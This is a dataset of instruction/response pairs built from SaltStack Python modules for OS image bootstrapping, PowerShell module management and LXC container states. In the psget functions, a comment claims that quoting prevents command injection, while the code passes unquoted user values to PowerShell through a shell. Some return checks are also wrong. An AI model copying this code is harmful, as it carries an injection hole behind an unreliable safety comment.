{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\nbootstrapping an image using the Debian tools.", "response": "def _bootstrap_deb(\n        root,\n        arch,\n        flavor,\n        repo_url=None,\n        static_qemu=None,\n        pkgs=None,\n        exclude_pkgs=None,\n    ):\n    '''\n    Bootstrap an image using the Debian tools\n\n    root\n        The root of the image to install to. Will be created as a directory if\n        it does not exist. (e.x.: /root/wheezy)\n\n    arch\n        Architecture of the target image. (e.x.: amd64)\n\n    flavor\n        Flavor of Debian to install. (e.x.: wheezy)\n\n    repo_url\n        Base URL for the mirror to install from.\n        (e.x.: http://ftp.debian.org/debian/)\n\n    static_qemu\n        Local path to the static qemu binary required for this arch.\n        (e.x.: /usr/bin/qemu-amd64-static)\n\n    pkgs\n        A list of packages to be installed on this image.\n\n    exclude_pkgs\n        A list of packages to be excluded.\n    '''\n\n    if repo_url is None:\n        repo_url = 'http://ftp.debian.org/debian/'\n\n    if not salt.utils.path.which('debootstrap'):\n        log.error('Required tool debootstrap is not installed.')\n        return False\n\n    if static_qemu and not salt.utils.validate.path.is_executable(static_qemu):\n        log.error('Required tool qemu not present/readable at: %s', static_qemu)\n        return False\n\n    if isinstance(pkgs, (list, tuple)):\n        pkgs = ','.join(pkgs)\n    if isinstance(exclude_pkgs, (list, tuple)):\n        exclude_pkgs = ','.join(exclude_pkgs)\n\n    deb_args = [\n        'debootstrap',\n        '--foreign',\n        '--arch',\n        _cmd_quote(arch)]\n\n    if pkgs:\n        deb_args += ['--include', _cmd_quote(pkgs)]\n    if exclude_pkgs:\n        deb_args += ['--exclude', _cmd_quote(exclude_pkgs)]\n\n    deb_args += [\n        _cmd_quote(flavor),\n        _cmd_quote(root),\n        _cmd_quote(repo_url),\n    ]\n\n    __salt__['cmd.run'](deb_args, python_shell=False)\n\n    if static_qemu:\n        __salt__['cmd.run'](\n            'cp {qemu} {root}/usr/bin/'.format(\n                qemu=_cmd_quote(static_qemu), root=_cmd_quote(root)\n            )\n        )\n\n    env = {'DEBIAN_FRONTEND': 'noninteractive',\n           'DEBCONF_NONINTERACTIVE_SEEN': 'true',\n           'LC_ALL': 'C',\n           'LANGUAGE': 'C',\n           'LANG': 'C',\n           'PATH': '/sbin:/bin:/usr/bin'}\n    __salt__['cmd.run'](\n        'chroot {root} /debootstrap/debootstrap --second-stage'.format(\n            root=_cmd_quote(root)\n        ),\n        env=env\n    )\n    __salt__['cmd.run'](\n        'chroot {root} dpkg --configure -a'.format(\n            root=_cmd_quote(root)\n        ),\n        env=env\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _bootstrap_pacman(\n        root,\n        pkg_confs='/etc/pacman*',\n        img_format='dir',\n        pkgs=None,\n        exclude_pkgs=None,\n    ):\n    '''\n    Bootstrap an image using the pacman tools\n\n    root\n        The root of the image to install to. Will be created as a directory if\n        it does not exist. (e.x.: /root/arch)\n\n    pkg_confs\n        The location of the conf files to copy into the image, to point pacman\n        to the right repos and configuration.\n\n    img_format\n        The image format to be used. The ``dir`` type needs no special\n        treatment, but others need special treatment.\n\n    pkgs\n        A list of packages to be installed on this image. For Arch Linux, this\n        will include ``pacman``, ``linux``, ``grub``, and ``systemd-sysvcompat``\n        by default.\n\n    exclude_pkgs\n        A list of packages to be excluded. If you do not want to install the\n        defaults, you need to include them in this list.\n    '''\n    _make_nodes(root)\n\n    if pkgs is None:\n        pkgs = []\n    elif isinstance(pkgs, six.string_types):\n        pkgs = pkgs.split(',')\n\n    default_pkgs = ('pacman', 'linux', 'systemd-sysvcompat', 'grub')\n    for pkg in default_pkgs:\n        if pkg not in pkgs:\n            pkgs.append(pkg)\n\n    if exclude_pkgs is None:\n        exclude_pkgs = []\n    elif isinstance(exclude_pkgs, six.string_types):\n        exclude_pkgs = exclude_pkgs.split(',')\n\n    for pkg in exclude_pkgs:\n        pkgs.remove(pkg)\n\n    if img_format != 'dir':\n        __salt__['mount.mount']('{0}/proc'.format(root), '/proc', fstype='', opts='bind')\n        __salt__['mount.mount']('{0}/dev'.format(root), '/dev', fstype='', opts='bind')\n\n    __salt__['file.mkdir'](\n        '{0}/var/lib/pacman/local'.format(root), 'root', 'root', '755'\n    )\n    pac_files = [rf for rf in os.listdir('/etc') if rf.startswith('pacman.')]\n    for pac_file in pac_files:\n        __salt__['cmd.run']('cp -r /etc/{0} {1}/etc'.format(pac_file, _cmd_quote(root)))\n    __salt__['file.copy']('/var/lib/pacman/sync', '{0}/var/lib/pacman/sync'.format(root), recurse=True)\n\n    pacman_args = ['pacman', '--noconfirm', '-r', _cmd_quote(root), '-S'] + pkgs\n    __salt__['cmd.run'](pacman_args, python_shell=False)\n\n    if img_format != 'dir':\n        __salt__['mount.umount']('{0}/proc'.format(root))\n        __salt__['mount.umount']('{0}/dev'.format(root))", "response": "Bootstrap an image using pacman tools"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _make_nodes(root):\n    '''\n    Make the minimum number of nodes inside of /dev/. Based on:\n\n    https://wiki.archlinux.org/index.php/Linux_Containers\n    '''\n    dirs = (\n        ('{0}/etc'.format(root), 'root', 'root', '755'),\n        ('{0}/dev'.format(root), 'root', 'root', '755'),\n        ('{0}/proc'.format(root), 'root', 'root', '755'),\n        ('{0}/dev/pts'.format(root), 'root', 'root', '755'),\n        ('{0}/dev/shm'.format(root), 'root', 'root', '1755'),\n    )\n\n    nodes = (\n        ('{0}/dev/null'.format(root), 'c', 1, 3, 'root', 'root', '666'),\n        ('{0}/dev/zero'.format(root), 'c', 1, 5, 'root', 'root', '666'),\n        ('{0}/dev/random'.format(root), 'c', 1, 8, 'root', 'root', '666'),\n        ('{0}/dev/urandom'.format(root), 'c', 1, 9, 'root', 'root', '666'),\n        ('{0}/dev/tty'.format(root), 'c', 5, 0, 'root', 'root', '666'),\n        ('{0}/dev/tty0'.format(root), 'c', 4, 0, 'root', 'root', '666'),\n        ('{0}/dev/console'.format(root), 'c', 5, 1, 'root', 'root', '600'),\n        ('{0}/dev/full'.format(root), 'c', 1, 7, 'root', 'root', '666'),\n        ('{0}/dev/initctl'.format(root), 'p', 0, 0, 'root', 'root', '600'),\n        ('{0}/dev/ptmx'.format(root), 'c', 5, 2, 'root', 'root', '666'),\n    )\n\n    for path in dirs:\n        __salt__['file.mkdir'](*path)\n\n    for path in nodes:\n        __salt__['file.mknod'](*path)", "response": "Make the minimum number of nodes inside of the Linux containers."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef avail_platforms():\n    '''\n    Return which platforms are available\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion genesis.avail_platforms\n    '''\n    ret = {}\n    for platform in CMD_MAP:\n        ret[platform] = True\n        for cmd in CMD_MAP[platform]:\n            if not salt.utils.path.which(cmd):\n                ret[platform] = False\n    return ret", "response": "Return which platforms are available"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\npacking up a directory structure into a specific format", "response": "def pack(name, root, path=None, pack_format='tar', compress='bzip2'):\n    '''\n    Pack up a directory structure, into a specific format\n\n    CLI Examples:\n\n    .. code-block:: bash\n\n        salt myminion genesis.pack centos /root/centos\n        salt myminion genesis.pack centos /root/centos pack_format='tar'\n    '''\n    if pack_format == 'tar':\n        _tar(name, root, path, compress)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef unpack(name, dest=None, path=None, pack_format='tar', compress='bz2'):\n    '''\n    Unpack an image into a directory structure\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt myminion genesis.unpack centos /root/centos\n    '''\n    if pack_format == 'tar':\n        _untar(name, dest, path, compress)", "response": "Unpack an image into a directory structure"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\npack up a single image in a tar format", "response": "def _tar(name, root, path=None, compress='bzip2'):\n    '''\n    Pack up image in a tar format\n    '''\n    if path is None:\n        path = os.path.join(salt.syspaths.BASE_FILE_ROOTS_DIR, 'img')\n    if not __salt__['file.directory_exists'](path):\n        try:\n            __salt__['file.mkdir'](path)\n        except Exception as exc:\n            return {'Error': salt.utils.stringutils.to_unicode(pprint.pformat(exc))}\n\n    compression, ext = _compress(compress)\n\n    tarfile = '{0}/{1}.tar.{2}'.format(path, name, ext)\n    out = __salt__['archive.tar'](\n        options='{0}pcf'.format(compression),\n        tarfile=tarfile,\n        sources='.',\n        dest=root,\n    )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef mksls(fmt, src, dst=None):\n    '''\n    Convert an installation file/script to an SLS file. Currently supports\n    ``kickstart``, ``preseed``, and ``autoyast``.\n\n    CLI Examples:\n\n        salt <minion> genesis.mksls kickstart /path/to/kickstart.cfg\n        salt <minion> genesis.mksls kickstart /path/to/kickstart.cfg /path/to/dest.sls\n\n    .. versionadded:: Beryllium\n    '''\n    if fmt == 'kickstart':\n        return salt.utils.kickstart.mksls(src, dst)\n    elif fmt == 'preseed':\n        return salt.utils.preseed.mksls(src, dst)\n    elif fmt == 'autoyast':\n        return salt.utils.yast.mksls(src, dst)", "response": "Convert an installation file or script to an SLS file. Currently supports\n    kickstart preseed and autoyast."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nexecuting the desired powershell command and ensure that it returns data in json format and load that into python", "response": "def _pshell(cmd, cwd=None, json_depth=2):\n    '''\n    Execute the desired powershell command and ensure that it returns data\n    in json format and load that into python\n    '''\n    if 'convertto-json' not in cmd.lower():\n        cmd = '{0} | ConvertTo-Json -Depth {1}'.format(cmd, json_depth)\n    log.debug('DSC: %s', cmd)\n    results = __salt__['cmd.run_all'](cmd, shell='powershell', cwd=cwd, python_shell=True)\n\n    if 'pid' in results:\n        del results['pid']\n\n    if 'retcode' not in results or results['retcode'] != 0:\n        # run_all logs an error to log.error, fail hard back to the user\n        raise CommandExecutionError('Issue executing powershell {0}'.format(cmd), info=results)\n\n    try:\n        ret = salt.utils.json.loads(results['stdout'], strict=False)\n    except ValueError:\n        raise CommandExecutionError('No JSON results from powershell', info=results)\n\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef avail_modules(desc=False):\n    '''\n    List available modules in registered Powershell module repositories.\n\n    :param desc: If ``True``, the verbose description will be returned.\n    :type  desc: ``bool``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'win01' psget.avail_modules\n        salt 'win01' psget.avail_modules desc=True\n    '''\n    cmd = 'Find-Module'\n    modules = _pshell(cmd)\n    names = []\n    if desc:\n        names = {}\n    for module in modules:\n        if desc:\n            names[module['Name']] = module['Description']\n            continue\n        names.append(module['Name'])\n    return names", "response": "Return a list of available Powershell modules."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef list_modules(desc=False):\n    '''\n    List currently installed PSGet Modules on the system.\n\n    :param desc: If ``True``, the verbose description will be returned.\n    :type  desc: ``bool``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'win01' psget.list_modules\n        salt 'win01' psget.list_modules desc=True\n    '''\n    cmd = 'Get-InstalledModule'\n    modules = _pshell(cmd)\n    if isinstance(modules, dict):\n        ret = []\n        if desc:\n            modules_ret = {}\n            modules_ret[modules['Name']] = copy.deepcopy(modules)\n            modules = modules_ret\n            return modules\n        ret.append(modules['Name'])\n        return ret\n    names = []\n    if desc:\n        names = {}\n    for module in modules:\n        if desc:\n            names[module['Name']] = module\n            continue\n        names.append(module['Name'])\n    return names", "response": "List currently installed PSGet Modules on the system."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ninstalling a Powershell module from powershell gallery on the system.", "response": "def install(name, minimum_version=None, required_version=None, scope=None,\n            repository=None):\n    '''\n    Install a Powershell module from powershell gallery on the system.\n\n    :param name: Name of a Powershell module\n    :type  name: ``str``\n\n    :param minimum_version: The maximum version to install, e.g. 1.23.2\n    :type  minimum_version: ``str``\n\n    :param required_version: Install a specific version\n    :type  required_version: ``str``\n\n    :param scope: The scope to install the module to, e.g. CurrentUser, Computer\n    :type  scope: ``str``\n\n    :param repository: The friendly name of a private repository, e.g. MyREpo\n    :type  repository: ``str``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'win01' psget.install PowerPlan\n    '''\n    # Putting quotes around the parameter protects against command injection\n    flags = [('Name', name)]\n\n    if minimum_version is not None:\n        flags.append(('MinimumVersion', minimum_version))\n    if required_version is not None:\n        flags.append(('RequiredVersion', required_version))\n    if scope is not None:\n        flags.append(('Scope', scope))\n    if repository is not None:\n        flags.append(('Repository', repository))\n    params = ''\n    for flag, value in flags:\n        params += '-{0} {1} '.format(flag, value)\n    cmd = 'Install-Module {0} -Force'.format(params)\n    _pshell(cmd)\n    return name in list_modules()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nupdating a Powershell module with a specific version or the newest one.", "response": "def update(name, maximum_version=None, required_version=None):\n    '''\n    Update a PowerShell module to a specific version, or the newest\n\n    :param name: Name of a Powershell module\n    :type  name: ``str``\n\n    :param maximum_version: The maximum version to install, e.g. 1.23.2\n    :type  maximum_version: ``str``\n\n    :param required_version: Install a specific version\n    :type  required_version: ``str``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'win01' psget.update PowerPlan\n    '''\n    # Putting quotes around the parameter protects against command injection\n    flags = [('Name', name)]\n\n    if maximum_version is not None:\n        flags.append(('MaximumVersion', maximum_version))\n    if required_version is not None:\n        flags.append(('RequiredVersion', required_version))\n\n    params = ''\n    for flag, value in flags:\n        params += '-{0} {1} '.format(flag, value)\n    cmd = 'Update-Module {0} -Force'.format(params)\n    _pshell(cmd)\n    return name in list_modules()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef remove(name):\n    '''\n    Remove a Powershell DSC module from the system.\n\n    :param  name: Name of a Powershell DSC module\n    :type   name: ``str``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'win01' psget.remove PowerPlan\n    '''\n    # Putting quotes around the parameter protects against command injection\n    cmd = 'Uninstall-Module \"{0}\"'.format(name)\n    no_ret = _pshell(cmd)\n    return name not in list_modules()", "response": "Remove a Powershell DSC module from the system."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nregistering a PSGet repository on the local machine", "response": "def register_repository(name, location, installation_policy=None):\n    '''\n    Register a PSGet repository on the local machine\n\n    :param name: The name for the repository\n    :type  name: ``str``\n\n    :param location: The URI for the repository\n    :type  location: ``str``\n\n    :param installation_policy: The installation policy\n        for packages, e.g. Trusted, Untrusted\n    :type  installation_policy: ``str``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'win01' psget.register_repository MyRepo https://myrepo.mycompany.com/packages\n    '''\n    # Putting quotes around the parameter protects against command injection\n    flags = [('Name', name)]\n\n    flags.append(('SourceLocation', location))\n    if installation_policy is not None:\n        flags.append(('InstallationPolicy', installation_policy))\n\n    params = ''\n    for flag, value in flags:\n        params += '-{0} {1} '.format(flag, value)\n    cmd = 'Register-PSRepository {0}'.format(params)\n    no_ret = _pshell(cmd)\n    return name not in list_modules()"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_repository(name):\n    '''\n    Get the details of a local PSGet repository\n\n    :param  name: Name of the repository\n    :type   name: ``str``\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt 'win01' psget.get_repository MyRepo\n    '''\n    # Putting quotes around the parameter protects against command injection\n    cmd = 'Get-PSRepository \"{0}\"'.format(name)\n    no_ret = _pshell(cmd)\n    return name not in list_modules()", "response": "Get the details of a local PSGet repository"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a new container with the specified parameters.", "response": "def present(name,\n            running=None,\n            clone_from=None,\n            snapshot=False,\n            profile=None,\n            network_profile=None,\n            template=None,\n            options=None,\n            image=None,\n            config=None,\n            fstype=None,\n            size=None,\n            backing=None,\n            vgname=None,\n            lvname=None,\n            thinpool=None,\n            path=None):\n    '''\n    .. versionchanged:: 2015.8.0\n\n        The :mod:`lxc.created <salt.states.lxc.created>` state has been renamed\n        to ``lxc.present``, and the :mod:`lxc.cloned <salt.states.lxc.cloned>`\n        state has been merged into this state.\n\n    Create the named container if it does not exist\n\n    name\n        The name of the container to be created\n\n    path\n        path to the container parent\n        default: /var/lib/lxc (system default)\n\n        .. versionadded:: 2015.8.0\n\n\n    running : False\n        * If ``True``, ensure that the container is running\n        * If ``False``, ensure that the container is stopped\n        * If ``None``, do nothing with regards to the running state of the\n          container\n\n        .. versionadded:: 2015.8.0\n\n    clone_from\n        Create named container as a clone of the specified container\n\n    snapshot : False\n        Use Copy On Write snapshots (LVM). Only supported with ``clone_from``.\n\n    profile\n        Profile to use in container creation (see the :ref:`LXC Tutorial\n        <tutorial-lxc-profiles-container>` for more information). Values in a\n        profile will be overridden by the parameters listed below.\n\n    network_profile\n        Network Profile to use in container creation\n        (see the :ref:`LXC Tutorial <tutorial-lxc-profiles-container>`\n        for more information). Values in a profile will be overridden by\n        the parameters listed below.\n\n        .. versionadded:: 2015.5.2\n\n    **Container Creation Arguments**\n\n    template\n        The template to use. For example, ``ubuntu`` or ``fedora``.\n        For a full list of available templates, check out\n        the :mod:`lxc.templates <salt.modules.lxc.templates>` function.\n\n        Conflicts with the ``image`` argument.\n\n        .. note::\n\n            The ``download`` template requires the following three parameters\n            to be defined in ``options``:\n\n            * **dist** - The name of the distribution\n            * **release** - Release name/version\n            * **arch** - Architecture of the container\n\n            The available images can be listed using the :mod:`lxc.images\n            <salt.modules.lxc.images>` function.\n\n    options\n\n        .. versionadded:: 2015.5.0\n\n        Template-specific options to pass to the lxc-create command. These\n        correspond to the long options (ones beginning with two dashes) that\n        the template script accepts. For example:\n\n        .. code-block:: yaml\n\n            web01:\n              lxc.present:\n                - template: download\n                - options:\n                    dist: centos\n                    release: 6\n                    arch: amd64\n\n        Remember to double-indent the options, due to :ref:`how PyYAML works\n        <nested-dict-indentation>`.\n\n        For available template options, refer to the lxc template scripts\n        which are ususally located under ``/usr/share/lxc/templates``,\n        or run ``lxc-create -t <template> -h``.\n\n    image\n        A tar archive to use as the rootfs for the container. Conflicts with\n        the ``template`` argument.\n\n    backing\n        The type of storage to use. Set to ``lvm`` to use an LVM group.\n        Defaults to filesystem within /var/lib/lxc.\n\n    fstype\n        Filesystem type to use on LVM logical volume\n\n    size\n        Size of the volume to create. Only applicable if ``backing`` is set to\n        ``lvm``.\n\n    vgname : lxc\n        Name of the LVM volume group in which to create the volume for this\n        container. Only applicable if ``backing`` is set to ``lvm``.\n\n    lvname\n        Name of the LVM logical volume in which to create the volume for this\n        container. Only applicable if ``backing`` is set to ``lvm``.\n\n    thinpool\n        Name of a pool volume that will be used for thin-provisioning this\n        container. Only applicable if ``backing`` is set to ``lvm``.\n    '''\n    ret = {'name': name,\n           'result': True,\n           'comment': 'Container \\'{0}\\' already exists'.format(name),\n           'changes': {}}\n\n    if not any((template, image, clone_from)):\n        # Take a peek into the profile to see if there is a clone source there.\n        # Otherwise, we're assuming this is a template/image creation. Also\n        # check to see if none of the create types are in the profile. If this\n        # is the case, then bail out early.\n        c_profile = __salt__['lxc.get_container_profile'](profile)\n        if not any(x for x in c_profile\n                   if x in ('template', 'image', 'clone_from')):\n            ret['result'] = False\n            ret['comment'] = ('No template, image, or clone_from parameter '\n                              'was found in either the state\\'s arguments or '\n                              'the LXC profile')\n        else:\n            try:\n                # Assign the profile's clone_from param to the state, so that\n                # we know to invoke lxc.clone to create the container.\n                clone_from = c_profile['clone_from']\n            except KeyError:\n                pass\n\n    # Sanity check(s)\n    if clone_from and not __salt__['lxc.exists'](clone_from, path=path):\n        ret['result'] = False\n        ret['comment'] = ('Clone source \\'{0}\\' does not exist'\n                          .format(clone_from))\n    if not ret['result']:\n        return ret\n\n    action = 'cloned from {0}'.format(clone_from) if clone_from else 'created'\n\n    state = {'old': __salt__['lxc.state'](name, path=path)}\n    if __opts__['test']:\n        if state['old'] is None:\n            ret['comment'] = (\n                'Container \\'{0}\\' will be {1}'.format(\n                    name,\n                    'cloned from {0}'.format(clone_from) if clone_from\n                    else 'created')\n            )\n            ret['result'] = None\n            return ret\n        else:\n            if running is None:\n                # Container exists and we're not managing whether or not it's\n                # running. Set the result back to True and return\n                return ret\n            elif running:\n                if state['old'] in ('frozen', 'stopped'):\n                    ret['comment'] = (\n                        'Container \\'{0}\\' would be {1}'.format(\n                            name,\n                            'unfrozen' if state['old'] == 'frozen'\n                                else 'started'\n                        )\n                    )\n                    ret['result'] = None\n                    return ret\n                else:\n                    ret['comment'] += ' and is running'\n                    return ret\n            else:\n                if state['old'] in ('frozen', 'running'):\n                    ret['comment'] = (\n                        'Container \\'{0}\\' would be stopped'.format(name)\n                    )\n                    ret['result'] = None\n                    return ret\n                else:\n                    ret['comment'] += ' and is stopped'\n                    return ret\n\n    if state['old'] is None:\n        # Container does not exist\n        try:\n            if clone_from:\n                result = __salt__['lxc.clone'](name,\n                                               clone_from,\n                                               profile=profile,\n                                               network_profile=network_profile,\n                                               snapshot=snapshot,\n                                               size=size,\n                                               path=path,\n                                               backing=backing)\n            else:\n                result = __salt__['lxc.create'](\n                    name,\n                    profile=profile,\n                    network_profile=network_profile,\n                    template=template,\n                    options=options,\n                    image=image,\n                    config=config,\n                    fstype=fstype,\n                    size=size,\n                    backing=backing,\n                    vgname=vgname,\n                    path=path,\n                    lvname=lvname,\n                    thinpool=thinpool)\n        except (CommandExecutionError, SaltInvocationError) as exc:\n            ret['result'] = False\n            ret['comment'] = exc.strerror\n        else:\n            if clone_from:\n                ret['comment'] = ('Cloned container \\'{0}\\' as \\'{1}\\''\n                                  .format(clone_from, name))\n            else:\n                ret['comment'] = 'Created container \\'{0}\\''.format(name)\n            state['new'] = result['state']['new']\n\n    if ret['result'] is True:\n        # Enforce the \"running\" parameter\n        if running is None:\n            # Don't do anything\n            pass\n        elif running:\n            c_state = __salt__['lxc.state'](name, path=path)\n            if c_state == 'running':\n                ret['comment'] += ' and is running'\n            else:\n                error = ', but it could not be started'\n                try:\n                    start_func = 'lxc.unfreeze' if c_state == 'frozen' \\\n                        else 'lxc.start'\n                    state['new'] = __salt__[start_func](\n                        name, path=path\n                    )['state']['new']\n                    if state['new'] != 'running':\n                        ret['result'] = False\n                        ret['comment'] += error\n                except (SaltInvocationError, CommandExecutionError) as exc:\n                    ret['result'] = False\n                    ret['comment'] += '{0}: {1}'.format(error, exc)\n                else:\n                    if state['old'] is None:\n                        ret['comment'] += ', and the container was started'\n                    else:\n                        ret['comment'] = (\n                            'Container \\'{0}\\' was {1}'.format(\n                                name,\n                                'unfrozen' if state['old'] == 'frozen'\n                                    else 'started'\n                            )\n                        )\n\n        else:\n            c_state = __salt__['lxc.state'](name, path=path)\n            if c_state == 'stopped':\n                if state['old'] is not None:\n                    ret['comment'] += ' and is stopped'\n            else:\n                error = ', but it could not be stopped'\n                try:\n                    state['new'] = __salt__['lxc.stop'](\n                        name, path=path\n                    )['state']['new']\n                    if state['new'] != 'stopped':\n                        ret['result'] = False\n                        ret['comment'] += error\n                except (SaltInvocationError, CommandExecutionError) as exc:\n                    ret['result'] = False\n                    ret['comment'] += '{0}: {1}'.format(error, exc)\n                else:\n                    if state['old'] is None:\n                        ret['comment'] += ', and the container was stopped'\n                    else:\n                        ret['comment'] = ('Container \\'{0}\\' was stopped'\n                                          .format(name))\n\n    if 'new' not in state:\n        # Make sure we know the final state of the container before we return\n        state['new'] = __salt__['lxc.state'](name, path=path)\n    if state['old'] != state['new']:\n        ret['changes']['state'] = state\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef absent(name, stop=False, path=None):\n    '''\n    Ensure a container is not present, destroying it if present\n\n    name\n        Name of the container to destroy\n\n    stop\n        stop before destroying\n        default: false\n\n        .. versionadded:: 2015.5.2\n\n    path\n        path to the container parent\n        default: /var/lib/lxc (system default)\n\n        .. versionadded:: 2015.8.0\n\n\n    .. code-block:: yaml\n\n        web01:\n          lxc.absent\n    '''\n    ret = {'name': name,\n           'changes': {},\n           'result': True,\n           'comment': 'Container \\'{0}\\' does not exist'.format(name)}\n\n    if not __salt__['lxc.exists'](name, path=path):\n        return ret\n\n    if __opts__['test']:\n        ret['result'] = None\n        ret['comment'] = 'Container \\'{0}\\' would be destroyed'.format(name)\n        return ret\n\n    try:\n        result = __salt__['lxc.destroy'](name, stop=stop, path=path)\n    except (SaltInvocationError, CommandExecutionError) as exc:\n        ret['result'] = False\n        ret['comment'] = 'Failed to destroy container: {0}'.format(exc)\n    else:\n        ret['changes']['state'] = result['state']\n        ret['comment'] = 'Container \\'{0}\\' was destroyed'.format(name)\n    return ret", "response": "Ensure a container is absent destroying it if present"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nensures that a named container is running.", "response": "def running(name, restart=False, path=None):\n    '''\n    .. versionchanged:: 2015.5.0\n        The :mod:`lxc.started <salt.states.lxc.started>` state has been renamed\n        to ``lxc.running``\n\n    Ensure that a container is running\n\n    .. note::\n\n        This state does not enforce the existence of the named container, it\n        just starts the container if it is not running. To ensure that the\n        named container exists, use :mod:`lxc.present\n        <salt.states.lxc.present>`.\n\n    name\n        The name of the container\n\n    path\n        path to the container parent\n        default: /var/lib/lxc (system default)\n\n        .. versionadded:: 2015.8.0\n\n    restart : False\n        Restart container if it is already running\n\n    .. code-block:: yaml\n\n        web01:\n          lxc.running\n\n        web02:\n          lxc.running:\n            - restart: True\n    '''\n    ret = {'name': name,\n           'result': True,\n           'comment': 'Container \\'{0}\\' is already running'.format(name),\n           'changes': {}}\n\n    state = {'old': __salt__['lxc.state'](name, path=path)}\n    if state['old'] is None:\n        ret['result'] = False\n        ret['comment'] = 'Container \\'{0}\\' does not exist'.format(name)\n        return ret\n    elif state['old'] == 'running' and not restart:\n        return ret\n    elif state['old'] == 'stopped' and restart:\n        # No need to restart since container is not running\n        restart = False\n\n    if restart:\n        if state['old'] != 'stopped':\n            action = ('restart', 'restarted')\n        else:\n            action = ('start', 'started')\n    else:\n        if state['old'] == 'frozen':\n            action = ('unfreeze', 'unfrozen')\n        else:\n            action = ('start', 'started')\n\n    if __opts__['test']:\n        ret['result'] = None\n        ret['comment'] = ('Container \\'{0}\\' would be {1}'\n                          .format(name, action[1]))\n        return ret\n\n    try:\n        if state['old'] == 'frozen' and not restart:\n            result = __salt__['lxc.unfreeze'](name, path=path)\n        else:\n            if restart:\n                result = __salt__['lxc.restart'](name, path=path)\n            else:\n                result = __salt__['lxc.start'](name, path=path)\n    except (CommandExecutionError, SaltInvocationError) as exc:\n        ret['result'] = False\n        ret['comment'] = exc.strerror\n        state['new'] = __salt__['lxc.state'](name, path=path)\n    else:\n        state['new'] = result['state']['new']\n        if state['new'] != 'running':\n            ret['result'] = False\n            ret['comment'] = ('Unable to {0} container \\'{1}\\''\n                              .format(action[0], name))\n        else:\n            ret['comment'] = ('Container \\'{0}\\' was successfully {1}'\n                              .format(name, action[1]))\n        try:\n            ret['changes']['restarted'] = result['restarted']\n        except KeyError:\n            pass\n\n    if state['old'] != state['new']:\n        ret['changes']['state'] = state\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef stopped(name, kill=False, path=None):\n    '''\n    Ensure that a container is stopped\n\n    .. note::\n\n        This state does not enforce the existence of the named container, it\n        just stops the container if it running or frozen. To ensure that the\n        named container exists, use :mod:`lxc.present\n        <salt.states.lxc.present>`, or use the :mod:`lxc.absent\n        <salt.states.lxc.absent>` state to ensure that the container does not\n        exist.\n\n    name\n        The name of the container\n\n    path\n        path to the container parent\n        default: /var/lib/lxc (system default)\n\n        .. versionadded:: 2015.8.0\n\n    kill : False\n        Do not wait for the container to stop, kill all tasks in the container.\n        Older LXC versions will stop containers like this irrespective of this\n        argument.\n\n        .. versionadded:: 2015.5.0\n\n    .. code-block:: yaml\n\n        web01:\n          lxc.stopped\n    '''\n    ret = {'name': name,\n           'result': True,\n           'comment': 'Container \\'{0}\\' is already stopped'.format(name),\n           'changes': {}}\n\n    state = {'old': __salt__['lxc.state'](name, path=path)}\n    if state['old'] is None:\n        ret['result'] = False\n        ret['comment'] = 'Container \\'{0}\\' does not exist'.format(name)\n        return ret\n    elif state['old'] == 'stopped':\n        return ret\n\n    if kill:\n        action = ('force-stop', 'force-stopped')\n    else:\n        action = ('stop', 'stopped')\n\n    if __opts__['test']:\n        ret['result'] = None\n        ret['comment'] = ('Container \\'{0}\\' would be {1}'\n                          .format(name, action[1]))\n        return ret\n\n    try:\n        result = __salt__['lxc.stop'](name, kill=kill, path=path)\n    except (CommandExecutionError, SaltInvocationError) as exc:\n        ret['result'] = False\n        ret['comment'] = exc.strerror\n        state['new'] = __salt__['lxc.state'](name, path=path)\n    else:\n        state['new'] = result['state']['new']\n        if state['new'] != 'stopped':\n            ret['result'] = False\n            ret['comment'] = ('Unable to {0} container \\'{1}\\''\n                              .format(action[0], name))\n        else:\n            ret['comment'] = ('Container \\'{0}\\' was successfully {1}'\n                              .format(name, action[1]))\n\n    if state['old'] != state['new']:\n        ret['changes']['state'] = state\n    return ret", "response": "Ensure that a named container is stopped."}
